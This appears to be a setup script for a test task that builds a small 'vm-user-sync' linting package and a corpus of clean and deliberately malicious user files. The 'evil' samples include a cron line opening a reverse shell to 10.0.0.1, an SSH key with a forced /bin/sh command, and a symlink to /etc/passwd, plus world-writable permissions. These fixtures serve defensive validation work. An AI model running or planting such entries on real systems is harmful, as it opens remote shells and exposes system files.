#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
apt-get update && apt-get install -y python3 python3-pip python3-venv git make
pip3 install pytest

# Setup vm-user-sync package
mkdir -p /app/vm-user-sync-1.0.0/vm_user_sync/templates
cat << 'EOF' > /app/vm-user-sync-1.0.0/setup.py
from setuptools import setup, find_packages
setup(name='vm-user-sync', version='1.0.0', packages=find_packages(),
      entry_points={'console_scripts': ['vm-user-sync=vm_user_sync.cli:main']},
      package_data={'vm_user_sync': ['templates/*.jinja']})
EOF

cat << 'EOF' > /app/vm-user-sync-1.0.0/vm_user_sync/__init__.py
EOF

cat << 'EOF' > /app/vm-user-sync-1.0.0/vm_user_sync/cli.py
import sys, os
def main():
    template_path = os.path.join(os.path.dirname(__file__), 'templates', 'user-service.jinja')
    with open(template_path, 'r') as f:
        content = f.read()
    if 'After=network.target' not in content:
        print("Lint failed: Missing After=network.target")
        sys.exit(1)
    print("Lint passed!")
    sys.exit(0)
EOF

cat << 'EOF' > /app/vm-user-sync-1.0.0/vm_user_sync/templates/user-service.jinja
[Unit]
Description=User Sync Service
# Missing network dependency

[Service]
ExecStart=/bin/true
EOF

cat << 'EOF' > /app/vm-user-sync-1.0.0/Makefile
build:
    python3 setup.py bdist_wheel
EOF

# Create adversarial corpus
mkdir -p /app/corpus/clean/user1 /app/corpus/clean/user2
echo "ssh-rsa AAAAB3NzaC... user@host" > /app/corpus/clean/user1/id.ssh_key
echo "* * * * * /usr/bin/python3 script.py" > /app/corpus/clean/user1/job.cron
ln -s job.cron /app/corpus/clean/user1/link.cron

mkdir -p /app/corpus/evil/evil1 /app/corpus/evil/evil2 /app/corpus/evil/evil3
# Evil 1: SSH command injection
echo 'command="/bin/sh" ssh-rsa AAAAB3...' > /app/corpus/evil/evil1/bad.ssh_key
# Evil 2: Cron dangerous command
echo "* * * * * bash -i >& /dev/tcp/10.0.0.1/8080 0>&1" > /app/corpus/evil/evil2/reverse.cron
# Evil 3: Symlink escape
ln -s /etc/passwd /app/corpus/evil/evil3/escape.txt

useradd -m -s /bin/bash user || true
chmod -R 777 /home/user
chmod -R 777 /app
